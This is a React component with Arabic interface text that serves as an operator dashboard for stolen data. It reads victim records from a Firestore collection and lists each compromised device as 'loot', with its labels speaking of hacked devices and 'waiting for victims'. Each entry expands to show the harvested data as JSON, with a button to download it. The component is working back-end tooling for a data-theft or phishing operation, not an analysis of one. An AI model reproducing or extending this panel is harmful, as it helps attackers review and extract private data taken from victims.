import React, { useState, useEffect } from 'react';
import { getFirestore, collection, getDocs, orderBy, query } from "firebase/firestore";
import { database } from '../App'; 
import { ShieldAlert, User, Calendar, Database, ChevronDown, ChevronUp, Download } from 'lucide-react';

export default function Archive() {
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(true);
  const [expandedId, setExpandedId] = useState(null);

  useEffect(() => {
    const fetchLogs = async () => {
      try {
        // نستخدم الـ database المستورد من App.jsx
        const q = query(collection(database, "sys_logs_v2"), orderBy("_ts", "desc"));
        const querySnapshot = await getDocs(q);
        const data = querySnapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
        setLogs(data);
      } catch (e) { 
        console.error("Error fetching logs:", e); 
      }
      setLoading(false);
    };
    fetchLogs();
  }, []);

  if (loading) return <div className="text-center py-20 text-white font-black animate-pulse text-2xl italic">جاري استخراج الغنائم من السحاب... 🕵️‍♂️☁️</div>;

  return (
    <div className="min-h-screen bg-slate-950 p-6 text-right font-sans" dir="rtl">
      <div className="max-w-7xl mx-auto">
        <div className="flex items-center gap-4 mb-10 border-b border-white/10 pb-6">
          <div className="bg-red-600 p-3 rounded-2xl shadow-lg shadow-red-600/20">
            <ShieldAlert size={32} className="text-white" />
          </div>
          <div>
            <h1 className="text-3xl font-black text-white italic tracking-tighter">أرشيف السطو المطور 📁</h1>
            <p className="text-slate-500 font-bold">قائمة الأجهزة التي تم اختراق بياناتها وسحب ملفاتها</p>
          </div>
        </div>

        {logs.length === 0 ? (
          <div className="text-center py-20 bg-slate-900/20 rounded-[3rem] border border-dashed border-white/10">
            <p className="text-slate-500 font-bold text-xl">لا توجد بيانات مستلمة بعد.. بانتظار الضحايا 🎣</p>
          </div>
        ) : (
          <div className="space-y-6">
            {logs.map((log, index) => (
              <div key={log.id} className="bg-slate-900/40 border border-white/5 rounded-[2.5rem] overflow-hidden transition-all hover:border-purple-500/40 shadow-xl">
                {/* Header Section */}
                <div 
                  onClick={() => setExpandedId(expandedId === log.id ? null : log.id)}
                  className="p-6 cursor-pointer flex justify-between items-center bg-white/[0.02] hover:bg-white/[0.05] transition-colors"
                >
                  <div className="flex items-center gap-6">
                    <div className="bg-gradient-to-br from-purple-600 to-blue-600 w-14 h-14 rounded-2xl flex items-center justify-center text-white font-black shadow-lg">
                      #{logs.length - index}
                    </div>
                    <div>
                      <div className="flex items-center gap-2 text-white font-black text-xl">
                        <User size={18} className="text-purple-400" />
                        المعرف: <span className="text-slate-300 font-mono text-sm">{log._uid || log.id}</span>
                      </div>
                      <div className="flex items-center gap-4 mt-1">
                        <div className="flex items-center gap-1 text-slate-500 text-xs font-bold">
                          <Calendar size={14} />
                          {log._ts ? new Date(log._ts).toLocaleString('ar-EG') : 'وقت غير معروف'}
                        </div>
                        <div className="bg-green-500/10 text-green-500 text-[10px] px-2 py-0.5 rounded-full border border-green-500/20 font-black">
                          DATA SECURED ✅
                        </div>
                      </div>
                    </div>
                  </div>
                  <div className="bg-slate-800 p-2 rounded-xl text-slate-400">
                    {expandedId === log.id ? <ChevronUp size={20} /> : <ChevronDown size={20} />}
                  </div>
                </div>

                {/* Content Section (The Loot) */}
                {expandedId === log.id && (
                  <div className="p-8 bg-black/40 border-t border-white/5">
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                      {/* نحن هنا نمر على كل المفاتيح الموجودة داخل log.data أو log.loot */}
                      {Object.entries(log.data || log.loot || {}).map(([key, value]) => (
                        <div key={key} className="bg-slate-800/50 p-5 rounded-[2rem] border border-white/5 flex flex-col h-full shadow-inner">
                          <div className="flex items-center justify-between mb-4 border-b border-white/5 pb-3">
                            <div className="flex items-center gap-2 text-purple-400 font-black text-xs uppercase tracking-tighter">
                              <Database size={14} /> {key}
                            </div>
                            <span className="text-[10px] bg-slate-700 text-slate-300 px-2 py-0.5 rounded-md font-mono">JSON</span>
                          </div>
                          
                          <div className="flex-1 min-h-[150px] max-h-[300px] overflow-y-auto custom-scrollbar bg-black/30 rounded-2xl p-4 mb-4">
                            <pre className="text-[11px] text-green-500/80 font-mono leading-relaxed">
                              {JSON.stringify(value, null, 2)}
                            </pre>
                          </div>

                          <button 
                             onClick={() => {
                               const blob = new Blob([JSON.stringify(value, null, 2)], {type: 'application/json'});
                               const url = URL.createObjectURL(blob);
                               const a = document.createElement('a');
                               a.href = url; a.download = `${key}_loot.json`; a.click();
                             }}
                             className="w-full bg-white/5 hover:bg-white text-white hover:text-black py-3 rounded-2xl text-xs font-black transition-all flex items-center justify-center gap-2 border border-white/10"
                          >
                            <Download size={14} /> تحميل البيانات
                          </button>
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            ))}
          </div>
        )}
      </div>
      <style dangerouslySetInnerHTML={{__html: `
        .custom-scrollbar::-webkit-scrollbar { width: 4px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: #334155; border-radius: 10px; }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: #475569; }
      `}} />
    </div>
  );
}